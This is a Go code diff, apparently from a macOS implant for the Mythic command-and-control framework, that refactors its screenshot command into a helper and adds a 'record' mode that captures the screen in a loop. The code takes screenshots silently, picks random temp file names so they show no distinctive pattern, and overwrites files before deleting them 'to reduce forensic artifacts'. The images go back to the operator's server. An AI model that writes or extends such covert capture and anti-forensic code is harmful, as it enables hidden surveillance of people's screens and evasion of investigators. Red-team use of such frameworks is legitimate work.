@@ -22,33 +22,16 @@ func (c *ScreenshotDarwinCommand) Description() string {
 }
 
 func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResult {
-	// Create temp file for screenshot — random name (no distinctive pattern)
-	tf, tfErr := os.CreateTemp("", "")
-	if tfErr != nil {
-		return errorf("Error creating temp file: %v", tfErr)
-	}
-	tmpFile := tf.Name()
-	tf.Close()
+	params := parseScreenshotParams(task)
 
-	// Use screencapture: -x = no sound, -t png = PNG format
-	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
-		// Clean up on failure
-		secureRemove(tmpFile)
-		return errorf("Error capturing screenshot: %v\n%s", err, string(output))
+	if params.Action == "record" {
+		return screenshotRecordLoop(task, captureScreenDarwin, params)
 	}
 
-	// Read the screenshot file
-	imgData, err := os.ReadFile(tmpFile)
+	// Single screenshot
+	imgData, err := captureScreenDarwin()
 	if err != nil {
-		secureRemove(tmpFile)
-		return errorf("Error reading screenshot file: %v", err)
-	}
-
-	// Clean up temp file — overwrite before removal to reduce forensic artifacts
-	secureRemove(tmpFile)
-
-	if len(imgData) == 0 {
-		return errorResult("Screenshot captured but file was empty (no display available?)")
+		return errorf("Error: %v", err)
 	}
 
 	// Send screenshot to Mythic
@@ -74,4 +57,31 @@ func (c *ScreenshotDarwinCommand) Execute(task structs.Task) structs.CommandResu
 			}
 		}
 	}
+}
+
+// captureScreenDarwin captures a screenshot using macOS screencapture CLI.
+func captureScreenDarwin() ([]byte, error) {
+	tf, tfErr := os.CreateTemp("", "")
+	if tfErr != nil {
+		return nil, fmt.Errorf("creating temp file: %v", tfErr)
+	}
+	tmpFile := tf.Name()
+	tf.Close()
+
+	if output, err := execCmdTimeout("screencapture", "-x", "-t", "png", tmpFile); err != nil {
+		secureRemove(tmpFile)
+		return nil, fmt.Errorf("screencapture failed: %v\n%s", err, string(output))
+	}
+
+	imgData, err := os.ReadFile(tmpFile)
+	secureRemove(tmpFile)
+	if err != nil {
+		return nil, fmt.Errorf("reading screenshot file: %v", err)
+	}
+
+	if len(imgData) == 0 {
+		return nil, fmt.Errorf("screenshot captured but file was empty")
+	}
+
+	return imgData, nil
 }
